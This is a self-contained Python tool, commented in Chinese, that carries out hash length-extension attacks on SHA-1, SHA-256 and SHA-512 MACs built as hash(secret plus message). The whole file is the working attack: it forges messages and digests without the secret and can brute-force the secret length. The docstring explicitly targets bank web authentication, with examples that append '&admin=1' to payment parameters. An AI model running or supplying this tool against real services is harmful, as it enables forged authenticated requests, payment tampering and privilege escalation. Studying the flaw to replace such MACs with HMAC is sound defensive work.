#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SHA-1 / SHA-256 / SHA-512 长度扩展攻击 (纯 Python, 零依赖)
==========================================================
原理: MAC = H(secret ‖ msg) 拼接方式 → 已知摘要+secret长度即可构造
      H(secret ‖ msg ‖ padding ‖ append), 无需知道 secret。
同 SM3 长度扩展, 覆盖国际算法 (银行 Web 常见 SHA-256(secret+data) 认证)。

用法:
    python hash_le.py --algo sha256 --secret-len 16 \
        --message "amount=100&to=6222" --digest <hex> --append "&admin=1"
    # SHA-1 / SHA-512
    python hash_le.py --algo sha1 --secret-len 8 \
        --message "..." --digest <hex> --append "&x=1"
    # 爆破 secret 长度
    python hash_le.py --bruteforce 64 --algo sha256 \
        --message "..." --digest <hex> --append "&x=1" --secret testsecret
    # 自检
    python hash_le.py --selftest
"""
import argparse
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')

M32 = 0xFFFFFFFF
M64 = 0xFFFFFFFFFFFFFFFF

# ---------------- SHA-256 ----------------
SHA256_IV = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
             0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]
SHA256_K = [0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b,
            0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01,
            0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7,
            0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
            0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152,
            0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
            0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc,
            0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
            0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819,
            0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08,
            0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f,
            0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
            0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2]


def _rotr(x, n, bits=32):
    return ((x >> n) | (x << (bits - n))) & (M32 if bits == 32 else M64)


def sha256_compress(v, block):
    w = [int.from_bytes(block[i * 4:i * 4 + 4], 'big') for i in range(16)]
    for i in range(16, 64):
        s0 = _rotr(w[i - 15], 7) ^ _rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)
        s1 = _rotr(w[i - 2], 17) ^ _rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)
        w.append((w[i - 16] + s0 + w[i - 7] + s1) & M32)
    a, b, c, d, e, f, g, h = v
    for i in range(64):
        S1 = _rotr(e, 6) ^ _rotr(e, 11) ^ _rotr(e, 25)
        ch = (e & f) ^ (~e & M32 & g)
        t1 = (h + S1 + ch + SHA256_K[i] + w[i]) & M32
        S0 = _rotr(a, 2) ^ _rotr(a, 13) ^ _rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (S0 + maj) & M32
        h, g, f, e, d, c, b, a = g, f, e, (d + t1) & M32, c, b, a, (t1 + t2) & M32
    return [(v[i] + [a, b, c, d, e, f, g, h][i]) & M32 for i in range(8)]


# ---------------- SHA-1 ----------------
SHA1_IV = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0]
SHA1_K = ([0x5A827999] * 20 + [0x6ED9EBA1] * 20
          + [0x8F1BBCDC] * 20 + [0xCA62C1D6] * 20)


def sha1_compress(v, block):
    w = [int.from_bytes(block[i * 4:i * 4 + 4], 'big') for i in range(16)]
    for i in range(16, 80):
        # W[i] = (W[i-3]^W[i-8]^W[i-14]^W[i-16]) <<< 1 = ROTR(...,31)
        w.append(_rotr(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 31))
    a, b, c, d, e = v
    for i in range(80):
        if i < 20:
            f = (b & c) | ((~b & M32) & d)
        elif i < 40:
            f = b ^ c ^ d
        elif i < 60:
            f = (b & c) | (b & d) | (c & d)
        else:
            f = b ^ c ^ d
        # a<<<5 = ROTR(a,27);  b<<<30 = ROTR(b,2); K 用 SHA1_K[i] 直接索引
        temp = (_rotr(a, 27) + f + e + SHA1_K[i] + w[i]) & M32
        e, d, c, b, a = d, c, _rotr(b, 2), a, temp
    return [(v[i] + [a, b, c, d, e][i]) & M32 for i in range(5)]


# ---------------- SHA-512 ----------------
SHA512_IV = [0x6a09e667f3bcc908, 0xbb67ae8584caa73b, 0x3c6ef372fe94f82b,
             0xa54ff53a5f1d36f1, 0x510e527fade682d1, 0x9b05688c2b3e6c1f,
             0x1f83d9abfb41bd6b, 0x5be0cd19137e2179]
SHA512_K = [0x428a2f98d728ae22, 0x7137449123ef65cd, 0xb5c0fbcfec4d3b2f,
            0xe9b5dba58189dbbc, 0x3956c25bf348b538, 0x59f111f1b605d019,
            0x923f82a4af194f9b, 0xab1c5ed5da6d8118, 0xd807aa98a3030242,
            0x12835b0145706fbe, 0x243185be4ee4b28c, 0x550c7dc3d5ffb4e2,
            0x72be5d74f27b896f, 0x80deb1fe3b1696b1, 0x9bdc06a725c71235,
            0xc19bf174cf692694, 0xe49b69c19ef14ad2, 0xefbe4786384f25e3,
            0x0fc19dc68b8cd5b5, 0x240ca1cc77ac9c65, 0x2de92c6f592b0275,
            0x4a7484aa6ea6e483, 0x5cb0a9dcbd41fbd4, 0x76f988da831153b5,
            0x983e5152ee66dfab, 0xa831c66d2db43210, 0xb00327c898fb213f,
            0xbf597fc7beef0ee4, 0xc6e00bf33da88fc2, 0xd5a79147930aa725,
            0x06ca6351e003826f, 0x142929670a0e6e70, 0x27b70a8546d22ffc,
            0x2e1b21385c26c926, 0x4d2c6dfc5ac42aed, 0x53380d139d95b3df,
            0x650a73548baf63de, 0x766a0abb3c77b2a8, 0x81c2c92e47edaee6,
            0x92722c851482353b, 0xa2bfe8a14cf10364, 0xa81a664bbc423001,
            0xc24b8b70d0f89791, 0xc76c51a30654be30, 0xd192e819d6ef5218,
            0xd69906245565a910, 0xf40e35855771202a, 0x106aa07032bbd1b8,
            0x19a4c116b8d2d0c8, 0x1e376c085141ab53, 0x2748774cdf8eeb99,
            0x34b0bcb5e19b48a8, 0x391c0cb3c5c95a63, 0x4ed8aa4ae3418acb,
            0x5b9cca4f7763e373, 0x682e6ff3d6b2b8a3, 0x748f82ee5defb2fc,
            0x78a5636f43172f60, 0x84c87814a1f0ab72, 0x8cc702081a6439ec,
            0x90befffa23631e28, 0xa4506cebde82bde9, 0xbef9a3f7b2c67915,
            0xc67178f2e372532b, 0xca273eceea26619c, 0xd186b8c721c0c207,
            0xeada7dd6cde0eb1e, 0xf57d4f7fee6ed178, 0x06f067aa72176fba,
            0x0a637dc5a2c898a6, 0x113f9804bef90dae, 0x1b710b35131c471b,
            0x28db77f523047d84, 0x32caab7b40c72493, 0x3c9ebe0a15c9bebc,
            0x431d67c49c100d4c, 0x4cc5d4becb3e42b6, 0x597f299cfc657e2a,
            0x5fcb6fab3ad6faec, 0x6c44198c4a475817]


def _rr64(x, n):
    return ((x >> n) | (x << (64 - n))) & M64


def sha512_compress(v, block):
    w = [int.from_bytes(block[i * 8:i * 8 + 8], 'big') for i in range(16)]
    for i in range(16, 80):
        s0 = _rr64(w[i - 15], 1) ^ _rr64(w[i - 15], 8) ^ (w[i - 15] >> 7)
        s1 = _rr64(w[i - 2], 19) ^ _rr64(w[i - 2], 61) ^ (w[i - 2] >> 6)
        w.append((w[i - 16] + s0 + w[i - 7] + s1) & M64)
    a, b, c, d, e, f, g, h = v
    for i in range(80):
        S1 = _rr64(e, 14) ^ _rr64(e, 18) ^ _rr64(e, 41)
        ch = (e & f) ^ (~e & M64 & g)
        t1 = (h + S1 + ch + SHA512_K[i] + w[i]) & M64
        S0 = _rr64(a, 28) ^ _rr64(a, 34) ^ _rr64(a, 39)
        maj = (a & b) ^ (a & c) ^ (b & c)
        t2 = (S0 + maj) & M64
        h, g, f, e, d, c, b, a = g, f, e, (d + t1) & M64, c, b, a, (t1 + t2) & M64
    return [(v[i] + [a, b, c, d, e, f, g, h][i]) & M64 for i in range(8)]


ALGOS = {
    'sha1': {'compress': sha1_compress, 'iv': SHA1_IV, 'words': 5, 'bs': 64,
             'lenb': 8, 'wb': 32},
    'sha256': {'compress': sha256_compress, 'iv': SHA256_IV, 'words': 8, 'bs': 64,
               'lenb': 8, 'wb': 32},
    'sha512': {'compress': sha512_compress, 'iv': SHA512_IV, 'words': 8, 'bs': 128,
               'lenb': 16, 'wb': 64},
}


def _hash(data, algo, iv=None, total_bits=None):
    a = ALGOS[algo]
    v = list(iv) if iv else list(a['iv'])
    bits = total_bits if total_bits is not None else len(data) * 8
    zeros = (a['bs'] - a['lenb'] - (len(data) + 1) % a['bs']) % a['bs']
    pad = b'\x80' + b'\x00' * zeros
    pad += bits.to_bytes(a['lenb'], 'big')
    msg = data + pad
    for off in range(0, len(msg), a['bs']):
        v = a['compress'](v, msg[off:off + a['bs']])
    return v


def _hex_digest(state, algo):
    wb = ALGOS[algo]['wb']
    return b''.join(x.to_bytes(wb // 8, 'big') for x in state).hex()


def length_extension(algo, secret_len, message, digest, append):
    """返回 (forged_message, forged_digest_hex)。"""
    a = ALGOS[algo]
    orig_len = secret_len + len(message)
    zeros = (a['bs'] - a['lenb'] - (orig_len + 1) % a['bs']) % a['bs']
    pad = b'\x80' + b'\x00' * zeros
    pad += (orig_len * 8).to_bytes(a['lenb'], 'big')
    wb = a['wb']
    state = [int.from_bytes(digest[i * (wb // 8):(i + 1) * (wb // 8)], 'big')
             for i in range(a['words'])]
    new_total = orig_len + len(pad) + len(append)
    forged = message + pad + append
    new_state = _hash(append, algo, iv=state, total_bits=new_total * 8)
    return forged, _hex_digest(new_state, algo)


def selftest():
    import hashlib
    ok = True
    # 标准向量: 我的压缩实现 == hashlib
    for algo, ref in (('sha1', hashlib.sha1), ('sha256', hashlib.sha256),
                      ('sha512', hashlib.sha512)):
        algo_ok = True
        for data in (b'abc', b'', '银行报文 中文测试'.encode(), b'A' * 100):
            mine = _hex_digest(_hash(data, algo), algo)
            good = mine == ref(data).hexdigest()
            algo_ok = algo_ok and good
            if not good:
                print(f"  [FAIL] {algo} len={len(data)}")
        ok = ok and algo_ok
        print(f"  [{'OK' if algo_ok else 'FAIL'}] {algo} 压缩实现 == hashlib")

    # 长度扩展: 伪造摘要 == 真实 SM3/SHA(secret||forged)
    secret = b'testsecret123456'
    msg = b'amount=100&to=6222'
    append = b'&admin=1'
    for algo in ('sha1', 'sha256', 'sha512'):
        real = bytes.fromhex(_hex_digest(_hash(secret + msg, algo), algo))
        forged, fd = length_extension(algo, len(secret), msg, real, append)
        verify = _hex_digest(_hash(secret + forged, algo), algo) == fd
        ok = ok and verify
        print(f"  [{'OK' if verify else 'FAIL'}] {algo} 长度扩展: 伪造摘要==真实")

    print(f"\n[{'全部通过' if ok else '存在失败'}] SHA 长度扩展自检")
    sys.exit(0 if ok else 1)


def main():
    ap = argparse.ArgumentParser(description='SHA 长度扩展攻击')
    ap.add_argument('--selftest', action='store_true')
    ap.add_argument('--algo', choices=['sha1', 'sha256', 'sha512'], default='sha256')
    ap.add_argument('--secret-len', type=int, help='secret 字节长度')
    ap.add_argument('--bruteforce', type=int, metavar='MAX', help='爆破 1..MAX')
    ap.add_argument('--message', help='原始消息')
    ap.add_argument('--message-hex', help='原始消息 (hex)')
    ap.add_argument('--digest', required=False, help='已知摘要 (hex)')
    ap.add_argument('--append', default='', help='追加内容')
    ap.add_argument('--append-hex', default='', help='追加内容 (hex)')
    ap.add_argument('--secret', help='提供则真实验证')
    args = ap.parse_args()

    if args.selftest:
        selftest(); return
    if not args.digest:
        sys.exit("[-] 需要 --digest (已知摘要)")

    message = bytes.fromhex(args.message_hex) if args.message_hex else \
        (args.message.encode() if args.message else b'')
    append = bytes.fromhex(args.append_hex) if args.append_hex else args.append.encode()
    digest = bytes.fromhex(args.digest)
    want_bytes = ALGOS[args.algo]['words'] * (ALGOS[args.algo]['wb'] // 8)
    if len(digest) != want_bytes:
        sys.exit(f"[-] {args.algo} 摘要应为 {want_bytes} 字节")

    lens = range(1, args.bruteforce + 1) if args.bruteforce else \
        ([args.secret_len] if args.secret_len else [])
    if not lens:
        sys.exit("[-] 需要 --secret-len 或 --bruteforce")

    print(f"[*] {args.algo} 长度扩展 | 消息 {len(message)}B 追加 {len(append)}B")
    for sl in lens:
        forged, fd = length_extension(args.algo, sl, message, digest, append)
        print(f"\n[+] secret 长度 = {sl}:")
        print(f"    伪造消息 hex: {forged.hex()}")
        try:
            print(f"    明文片段    : {forged.decode('utf-8', 'replace')!r}")
        except Exception:
            pass
        print(f"    伪造摘要    : {fd}")
        if args.secret:
            ver = _hex_digest(_hash(args.secret.encode() + forged, args.algo),
                              args.algo) == fd
            print(f"    真实验证    : {'通过' if ver else '不通过'}")
            if ver:
                return


if __name__ == '__main__':
    main()
